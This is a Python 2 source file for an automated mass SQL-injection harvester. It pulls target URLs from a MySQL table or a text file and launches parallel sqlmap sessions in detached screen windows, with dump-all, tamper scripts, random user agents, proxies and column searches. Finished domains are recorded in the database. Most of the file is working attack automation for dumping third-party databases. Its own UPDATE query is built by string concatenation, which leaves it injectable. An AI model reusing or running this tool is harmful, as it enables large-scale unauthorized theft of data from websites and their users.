#from modules import logger
import logger
log = logger.logger_class()


from random import randint

import string
import string
import sys
reload(sys)  
sys.setdefaultencoding('utf8')
import os

import MySQLdb
import string
 
import socket
import codecs

import settings
setup = settings.settings_var


from os import walk
import subprocess, \
       threading, os, \
       time

class sqlmap_class():

    SQLMAP_DONE = []
    SQLMAP_LINKS = []
    
    db = MySQLdb.connect(host="localhost", user=setup.LOGIN, passwd=setup.PASSWORD, db=setup.DB, charset='utf8')
               

    def gen_limitStart_limitStop(self):
        return (randint(200, 1000))

    
      # SQLMAP LOAD DONE FILE
    def sqlmap_load_info(self):

        try:

           
            
            if setup.LINKS_INPUT =='MYSQL':
               
                log.info("sqlmap_class|sqlmap_load_info", "Load done url from MYSQL DB.")
                cursor =  self.db.cursor()
                
             
                sql = "SELECT header,http,url FROM posts WHERE  `sqlmap_check`=1 AND url !=''"
               
                cursor.execute(sql)
                 
                
                data =  cursor.fetchall()
               
                for rec in data:
                   
                    header,http,url = rec
                    url = str(url)
                    #print url
                    
                    header = "%s" % header
                    http = "%s" % http
                    
                    
                    new =  "%s" % url
                    
                    
                    #new = new.strip()
                    new = new.encode('utf-8').strip()
                    #new = unicode(new, 'utf-8')
                    
                    #print new
                  
                    #new = new.decode('utf-8').strip()
                    
                    if http=='https':
                        new_http='https://'
                    else:
                        new_http='http://'
                        
                    pp = header + '::'+ new_http + new
                    pp = str(pp)
                   
                   
                    
                    self.SQLMAP_LINKS.append(pp)
                    
                    
                    
                #print self.SQLMAP_LINKS
                #sys.exit()
                self.SQLMAP_LINKS =  list(set(self.SQLMAP_LINKS))
                print len(self.SQLMAP_LINKS)
                
               # print  self.SQLMAP_LINKS
                #sys.exit()
               
                
            else:
                    log.info("sqlmap_class|sqlmap_load_info", "Load done url from list.")
                    for done_url in open("sqlmap_done.txt", "r+").readlines():
                        self.SQLMAP_DONE.append(done_url.replace("\n", ""))
                
                #time.sleep(10)
            #print  self.SQLMAP_DONE
            #sys.exit()
        except Exception, error_code:
            log.warning("sqlmap_class|sqlmap_load_info", str(error_code))
            pass

    
    def clean_filename(self,filename):
        return filename.replace('https://','').replace('http://','').replace('post::','').replace('get::','')
    
    
  
    # SQLMAP SAVE DONE FILE
    def sqlmap_save_info(self, filename):
        try:

            if setup.LINKS_INPUT =='MYSQL':
            
                filename2 = self.clean_filename(filename)
            
            
                domen = filename2.replace('http://','').replace('https://','').split('/')[0]
                
                domen = domen.replace('www.','')
            
                sql = "UPDATE  `posts` SET  `sqlmap_check` = 2 WHERE  `url` ='"+filename2.strip()+"' or `domen` like '%"+domen+"%'"
                
                print sql
                
               
                
                cursor =  self.db.cursor()
                
                cursor.execute(sql)
                
                self.SQLMAP_DONE.append(filename.strip()) 
                
                #print sql
                #print self.SQLMAP_DONE
                #sys.exit()
                
                
                log.info("sqlmap_class|sqlmap_load_info", "Save in MYSQL to DB: " + filename)
            else:
                log.info("sqlmap_class|sqlmap_load_info", "Save in done to list: " + filename)
                open("sqlmap_done.txt", "a+").write(filename.strip() + "\n")
                self.SQLMAP_DONE.append(filename.strip()) 

        except Exception, error_code:
            log.warning("sqlmap_class|sqlmap_save_info", str(error_code))
            pass

    # CHECK SQLMAP THREADS
    def sqlmap_get_threads(self):

        try:

            sqlmap_processes = 0

            result = subprocess.Popen(['screen', '-ls'], stdout=subprocess.PIPE)
            
            #result = subprocess.Popen(['ps', '-ax|grep python'], stdout=subprocess.PIPE)

            
           
          
            
            for processes in result.stdout.readlines():

                #print processes
            
                if "sqlmap" in processes:
                    sqlmap_processes += 1
            
            
            return sqlmap_processes

        except Exception, error_code:
            log.warning("sqlmap_class|sqlmap_get_threads", str(error_code))
            pass

    # START SQLMAP THREAD
    def sqlmap_thread(self, url):

        try:

            log.info("sqlmap_class|sqlmap_thread", "Start new SQLMAP thread: " + url)

            #url.replace("\r\n",'')
            
            get_limits = self.gen_limitStart_limitStop()
            

            url2 = self.clean_filename(url)
            
            domen = url2.split('/')[0]
            
            url = url.strip()
            
            if setup.DUMP:
                
                if 'post' in url:
                    #print 'POST ENABLE PROXY YES '
                    url = url.replace('post::','')
                    url = url.replace('get::','')
                    
                    url_new = url.split('?')[0]
                    post = url.split('?')[1]
                    
                    
                    if setup.DUMPMODE_COL:
                    
                        COMANDS_DUMP = '--method POST --data="' + post + '" --batch --random-agent --technique=EU --dump-format=CSV --output-dir=' + setup.PATH_LOG + ' --timeout=15' + ' --threads=3 --answer="quit=N" --answer="crack=n"  --search -C ' + setup.DUMP_COLUMNS + " --tamper=" + setup.TAMPER_LIST + setup.PROXY 
                    else:
                        COMANDS_DUMP = '--method POST --data="' + post + '" --batch --random-agent --dbs --tables --columns --dump-all --technique=EU --dump-format=CSV --output-dir=' + setup.PATH_LOG + ' --timeout=15' + ' --threads=3 --start=' + str(get_limits) + ' --stop=' + str(get_limits + setup.SQLMAP_LINE_MAX) + ' --answer="quit=N" --answer="crack=n" '
                        
                else:
                    
                    url = url.replace('get::','')
                    url_new = url
                    
                    if setup.DUMPMODE_COL:
                    
                        COMANDS_DUMP = '--batch --random-agent  --technique=EU --dump-format=CSV --output-dir=' + setup.PATH_LOG + ' --timeout=15' + ' --threads=3 --answer="quit=N" --answer="crack=n"  --search -C ' + setup.DUMP_COLUMNS + " --tamper=" + setup.TAMPER_LIST
                    else:
                        COMANDS_DUMP = '--batch --random-agent --dbs --tables --columns --dump-all --technique=EU --dump-format=CSV --output-dir=' + setup.PATH_LOG + ' --timeout=15' + ' --threads=3 --start=' + str(get_limits) + ' --stop=' + str(get_limits + setup.SQLMAP_LINE_MAX) + ' --answer="quit=N" --answer="crack=n" '
                
                
                if setup.PROXY !='':
                    print 'GET POST ENABLE PROXY YES'
                    COMANDS_DUMP = COMANDS_DUMP+setup.PROXY
               
                
                os.system("cd sqlmap && screen -dm -S " + "sqlmap." + domen + " ./sqlmap.py -u '"  + url_new + "' " + COMANDS_DUMP)
               
                print "cd sqlmap && screen -dm -S " + "sqlmap." + domen + " ./sqlmap.py -u '"  + url_new + "' " + COMANDS_DUMP
            
            #esli prym chitko proverka na oshibki i vse
            else:
            
                url = url.replace('get::','')
                url = url.replace('post::','')
                url_new = url
            
                if setup.PROXY !='':
                    COMANDS = '--batch --random-agent --dbs --tables --columns  --technique=EU --output-dir=' + setup.PATH_LOG + ' --timeout=15' + ' --threads=3 --answer="quit=N" --answer="crack=n" '+setup.PROXY
                else:
                    COMANDS = '--batch --random-agent --dbs --tables --columns  --technique=EU --output-dir=' + setup.PATH_LOG + ' --timeout=15' + ' --threads=3 --answer="quit=N" --answer="crack=n"'
                
                
                os.system("cd sqlmap && screen -dm -S " + "sqlmap." + domen + " ./sqlmap.py -u '"  + url_new + "' " + COMANDS)
                
                print "cd sqlmap && screen -dm -S " + "sqlmap." + domen + " ./sqlmap.py -u '"  + url_new + "' " + COMANDS
                #sys.exit()

        except Exception, error_code:
            log.warning("sqlmap_class|sqlmap_thread", str(error_code))
            pass

    # SQLMAP TASKS WATCHER 
    def sqlmap_task_watcher(self):

        """
        SQLMAP Task watch system
        """

        try:

            log.info("sqlmap_class|sqlmap_task_watcher", "Watch tasks for sqlmap.")

            while True:

               
            
            
                log.info("sqlmap_class|sqlmap_task_watcher", "check current threads && new reports.")

                try:
                    
                    if setup.LINKS_INPUT == 'MYSQL':
                       
                        for file in self.SQLMAP_LINKS:
                            file = str(file)
                            file = file.strip()
                            #print file
                            #print self.SQLMAP_DONE
                            
                            if file not in self.SQLMAP_DONE:
                                
                               
                                #sys.exit()
                                if self.sqlmap_get_threads() < setup.SQLMAP_THREADS:
                                    print 'screen - '+str(self.sqlmap_get_threads())
                                    self.sqlmap_thread(file)
                                    self.sqlmap_save_info(file)
                                    time.sleep(5)
                                        
                       
                    else:
                        for file in open('sqlmap_links.txt','r').readlines():
                            file = file.strip()
                            
                            if file not in self.SQLMAP_DONE:

                                if self.sqlmap_get_threads() < setup.SQLMAP_THREADS:
                                    self.sqlmap_thread(file)
                                    self.sqlmap_save_info(file)
                                    time.sleep(5)
                    time.sleep(15)
                    
                    self.sqlmap_load_info()
                except Exception, error_code:
                    log.warning("sqlmap_class|sqlmap_task_watcher", str(error_code))
                    time.sleep(4)
                    pass
                
        except Exception, error_code:
            log.warning("sqlmap_class|sqlmap_task_watcher", str(error_code))
            pass

    def del_task(self, task):

        try:

            log.info("sqlmap_class|del_task", "Delete not done task: " + task)



        except Exception, error_code:
            log.warning("sqlmap_class|del_task", str(error_code))
            pass

    def __init__(self):

        try:
            

            #hostname = socket.gethostname()
            
            #ips =  socket.gethostbyname(socket.gethostname())
            
            #print ips
            
            
            #if(ips.strip() == '188.120.237.215'):
            #   pass
            #else:
            #   sys.exit()
            
            log.info("sqlmap_class|__init__", "Started.")
            
            
            #sqlmap_start_load = threading.Thread(target=self.sqlmap_load_info)
            #sqlmap_start_load.start()
            
            self.sqlmap_load_info()
                
            #self.sqlmap_load_info()

            sqlmap_start_watcher = threading.Thread(target=self.sqlmap_task_watcher)
            sqlmap_start_watcher.start()

        except Exception, error_code:
            log.warning("sqlmap_class|__init__", str(error_code))
            pass


sqlmap = sqlmap_class()        
            